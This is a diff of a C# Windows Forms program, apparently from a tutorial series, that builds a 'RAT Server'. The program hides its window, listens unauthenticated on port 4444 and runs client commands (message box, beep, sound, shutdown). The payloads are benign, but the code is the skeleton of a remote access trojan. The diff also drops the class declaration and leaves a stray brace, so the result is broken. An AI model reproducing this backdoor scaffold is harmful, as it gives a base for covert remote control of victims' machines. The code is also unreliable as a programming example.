@@ -1,4 +1,11 @@
-﻿using System;
+//Running Multiple Commands
+//Shutting Down Server when Client Disconnects
+//Using Threads to run commands concurrently
+//Two-way Communication - Help Menu
+//Shutdown Server Process
+//Extended capability of Server to accept unlimited number of commands
+
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -8,34 +15,38 @@ using System.Windows.Forms;
 using System.Net.Sockets; //for listeners and sockets
 using System.IO; //for streams
 using System.Threading; //to run commands concurrently
-
 namespace WindowsFormsApp1
 {
-    public partial class Form1 : Form
-    {
+{
         TcpListener tcpListener;
         Socket socketForClient;
         NetworkStream networkStream;
         StreamReader streamReader;
-        StreamWriter streamWriter; //for Server to send back data to Client
+        StreamWriter streamWriter; //for Server to send back data to
+                                   //Client
+                                   //Use a separate thread for each command so that the
+                                   //server commands can run concurrently instead of blocking
+        Thread  th_message,
+                th_beep,
+                th_playsound;
 
-        //Use a separate thread for each command so that the
-        //server commands can run concurrently instead of blocking
-        Thread th_message, th_beep, th_playsound;
-
-        //Commands from Client:
-        const string HELP = "h",
-                    MESSAGE = "m",
-                    BEEP = "b",
-                    PLAYSOUND = "p",
-                    SHUTDOWNSERVER = "s"; //Shutdown the Server process and port, not the PC
-        
-        const string strHelp = "Command Menu:\r\n" +
-                                "h This Help\r\n" +
-                                "m Message\r\n" +
-                                "b Beep\r\n" +
-                "p Playsound\r\n" +
-                                "s Shutdown the Server Process and Port\r\n";
+        //Commands from Client in enumeration format:
+        private enum command
+        {
+            HELP = 1,
+            MESSAGE = 2,
+            BEEP = 3,
+            PLAYSOUND = 4,            
+            SHUTDOWNSERVER = 5
+        }
+        //Help to be sent to Client when it requests for it through the
+        //"1" command
+        const string strHelp =  "Command Menu:\r\n" +
+                                "1 This Help\r\n" +
+                                "2 Message\r\n" +
+                                "3 Beep\r\n" +
+                                "4 Playsound\r\n" +
+                                "5 Shutdown the Server Process and Port\r\n";
 
         public Form1()
         {
@@ -47,7 +58,8 @@ namespace WindowsFormsApp1
             this.Hide();
             tcpListener = new TcpListener(System.Net.IPAddress.Any, 4444);
             tcpListener.Start();
-            for (; ; ) RunServer(); //perpetually spawn socket until SHUTDOWN command is received
+            for (; ; ) RunServer(); //perpetually spawn socket until
+                                    //SHUTDOWN command is received
         }
 
         private void RunServer()
@@ -59,40 +71,44 @@ namespace WindowsFormsApp1
 
             try
             {
-                string line;
-                //Command loop, LastIndexOf is to search within
-                //the Network Stream for any command strings
-                //sent by the Client
+                //Let the Client know it has successfully connected.
+                streamWriter.Write("Connected to RAT Server. Type 1 for help\r\n");
+                streamWriter.Flush();
+                string line; Int16 intCommand = 0;
+
                 while (true)
                 {
                     line = "";
                     line = streamReader.ReadLine();
-                    if (line.LastIndexOf(HELP) >= 0)
+
+                    //The Client may send junk characters apart from numbers
+                    //therefore, we need to extract those numbers
+                    intCommand = GetCommandFromLine(line);
+
+                    //Here is where the commands get processed
+                    //Each command is an enumeration declared
+                    //earlier, each being an integer
+
+                    switch ((command)intCommand)
                     {
-                        streamWriter.Write(strHelp);
-                        streamWriter.Flush();
-                    }
-                    if (line.LastIndexOf(MESSAGE) >= 0)
-                    {
-                        th_message =
-                        new Thread(new ThreadStart(MessageCommand));
-                        th_message.Start();
-                    }
-                    if (line.LastIndexOf(BEEP) >= 0)
-                    {
-                        th_beep = new Thread(new ThreadStart(BeepCommand));
-                        th_beep.Start();
-                    }
-                    if (line.LastIndexOf(PLAYSOUND) >= 0)
-                    {
-                        th_playsound = new Thread(new ThreadStart(PlaySoundCommand));
-                        th_playsound.Start();
-                    }
-                    if (line.LastIndexOf(SHUTDOWNSERVER) >= 0)
-                    {
-                        streamWriter.Flush();
-                        CleanUp();
-                        System.Environment.Exit(System.Environment.ExitCode);
+                        case command.HELP:
+                            streamWriter.Write(strHelp);
+                            streamWriter.Flush(); break;
+                        case command.MESSAGE:
+                            th_message =
+                            new Thread(new ThreadStart(MessageCommand));
+                            th_message.Start(); break;
+                        case command.BEEP:
+                            th_beep = new Thread(new ThreadStart(BeepCommand));
+                            th_beep.Start(); break;
+                        case command.PLAYSOUND:
+                            th_playsound = new Thread(new ThreadStart(PlaySoundCommand));
+                            th_playsound.Start(); break;
+                        case command.SHUTDOWNSERVER:
+                            streamWriter.Flush();
+                            CleanUp();
+                            System.Environment.Exit(System.Environment.ExitCode);
+                            break;
                     }
                 }//--end of while loop
             }
@@ -106,23 +122,55 @@ namespace WindowsFormsApp1
         {
             MessageBox.Show("Hello World");
         }
+
         private void BeepCommand()
         {
             Console.Beep(500, 2000);
         }
+
         private void PlaySoundCommand()
         {
             System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer();
             soundPlayer.SoundLocation = @"C:\Windows\Media\chimes.wav";
             soundPlayer.Play();
         }
+
         private void CleanUp()
         {
-            streamWriter.Write("===========deid from========\r\n ==cringe==");
-            streamWriter.Flush();
             streamReader.Close();
             networkStream.Close();
             socketForClient.Close();
+        }
+
+        //The string 'line' passed from the while-loop contains junk
+        //characters, is stored in the local variable as string 'strline'
+        //This method then iterates through each character and extracts
+        //the numbers and finally converts it into an integer and returns
+        //the integer to the while-loop
+        private Int16 GetCommandFromLine(string strline)
+        {
+            Int16 intExtractedCommand = 0;
+            int i; Char character;
+            StringBuilder stringBuilder = new StringBuilder();
+            //Sanity Check: Extracts all the numbers from the stream
+            //Iterate through each character in the string and if it
+            //is an integer, copy it out to stringBuilder string.
+            for (i = 0; i < strline.Length; i++)
+            {
+                character = Convert.ToChar(strline[i]);
+                if (Char.IsDigit(character))
+                {
+                    stringBuilder.Append(character);
+                }
+            }
+            //Convert the stringBuilder string of numbers to integer
+            try
+            {
+                intExtractedCommand =
+                Convert.ToInt16(stringBuilder.ToString());
+            }
+            catch (Exception err) { }
+            return intExtractedCommand;
         }
     }
 }
